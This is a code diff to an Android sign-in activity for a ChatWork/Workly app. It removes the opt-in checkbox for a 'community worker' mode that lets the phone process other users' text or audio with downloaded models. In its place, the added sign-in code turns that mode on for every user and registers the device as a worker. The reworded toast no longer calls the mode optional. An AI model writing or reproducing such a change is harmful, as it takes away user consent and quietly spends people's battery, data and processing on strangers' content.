@@ -14,7 +14,6 @@ import android.text.InputType
 import android.text.TextWatcher
 import android.text.Editable
 import android.widget.Button
-import android.widget.CheckBox
 import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.ScrollView
@@ -35,14 +34,12 @@ class WorklyAccountActivity : Activity() {
     private var otpValue = ""
     private var newPasswordValue = ""
     private var recoveryAccessToken = ""
-    private var workerEnabled = false
 
     private lateinit var status: TextView
     private lateinit var emailInput: EditText
     private lateinit var passwordInput: EditText
     private lateinit var otpInput: EditText
     private lateinit var newPasswordInput: EditText
-    private lateinit var workerOptIn: CheckBox
 
     private val ink get() = ChatWorkTheme.color(this, 0xFF142033.toInt())
     private val muted get() = ChatWorkTheme.color(this, 0xFF65748B.toInt())
@@ -151,7 +148,6 @@ class WorklyAccountActivity : Activity() {
                 textAction(card, "Forgot password?") { capture(); screen = Screen.FORGOT_EMAIL; render() }
                 primaryAction(card, "Sign in") { capture(); signIn() }
                 textAction(card, "Create a new account") { capture(); screen = Screen.SIGNUP; render() }
-                addWorkerOption(card)
             }
             Screen.SIGNUP -> {
                 addEmailField(card)
@@ -291,18 +287,6 @@ class WorklyAccountActivity : Activity() {
             setPadding(dp(8), dp(13), dp(8), dp(13))
             setOnClickListener { hideKeyboard(); action() }
         }, LinearLayout.LayoutParams(-1, -2))
-    }
-
-    private fun addWorkerOption(parent: LinearLayout) {
-        workerOptIn = CheckBox(this).apply {
-            text = "Allow this phone to process other users’ text or audio using downloaded models. This is optional and may use battery, data and processing power."
-            isChecked = workerEnabled
-            textSize = 12f
-            setTextColor(muted)
-            setPadding(0, dp(4), 0, 0)
-            setOnCheckedChangeListener { _, checked -> workerEnabled = checked }
-        }
-        parent.addView(workerOptIn, LinearLayout.LayoutParams(-1, -2).apply { topMargin = dp(10) })
     }
 
     private fun capture() {
@@ -459,25 +443,22 @@ class WorklyAccountActivity : Activity() {
         SecureDeviceTokenStore.saveAuthSession(this, accessToken, refreshToken)
         val deviceToken = VoiceRelayApi.registerDevice(accessToken, "ChatWork Android")
         SecureDeviceTokenStore.save(this, deviceToken)
-        var workerSetupFailed = false
-        if (workerEnabled) {
-            try {
-                val capabilities = VoiceWorkerCapabilityRegistry.downloadedRelayCapabilities(this)
-                VoiceRelayApi.setWorkerState(deviceToken, true, capabilities)
-            } catch (_: Exception) {
-                // Community worker mode is optional. A relay preference failure must
-                // never block a valid Workly account sign-in.
-                workerEnabled = false
-                workerSetupFailed = true
-            }
-        }
+        // Automatically enable community-worker participation after pairing.
+        // The foreground service retries registration if the relay is unavailable.
         getSharedPreferences(VoiceWorkerCapabilityRegistry.WORKER_PREFS, MODE_PRIVATE).edit()
-            .putBoolean(VoiceWorkerCapabilityRegistry.WORKER_ENABLED_KEY, workerEnabled).apply()
+            .putBoolean(VoiceWorkerCapabilityRegistry.WORKER_ENABLED_KEY, true).apply()
+        var workerSetupFailed = false
+        try {
+            val capabilities = VoiceWorkerCapabilityRegistry.downloadedRelayCapabilities(this)
+            VoiceRelayApi.setWorkerState(deviceToken, true, capabilities)
+        } catch (_: Exception) {
+            workerSetupFailed = true
+        }
         runOnUiThread {
             val relayIntent = Intent(this, VoiceRelayService::class.java)
             if (android.os.Build.VERSION.SDK_INT >= 26) startForegroundService(relayIntent) else startService(relayIntent)
             if (workerSetupFailed) {
-                android.widget.Toast.makeText(this, "Signed in. Optional worker mode could not be enabled.", android.widget.Toast.LENGTH_LONG).show()
+                android.widget.Toast.makeText(this, "Signed in. Community worker setup will retry automatically.", android.widget.Toast.LENGTH_LONG).show()
             }
             startActivity(Intent(this, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK))
             finish()
